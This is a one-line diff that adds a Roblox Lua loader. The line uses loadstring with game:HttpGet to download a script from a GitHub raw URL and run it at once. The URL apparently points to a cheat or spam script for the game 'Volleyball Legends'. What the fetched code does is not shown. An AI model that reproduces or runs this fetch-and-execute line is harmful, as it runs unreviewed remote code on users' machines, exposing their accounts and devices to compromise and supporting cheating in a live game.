@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/upd-volleyball-legends-spam3-uasdxvf0mk45hm.lua"))()
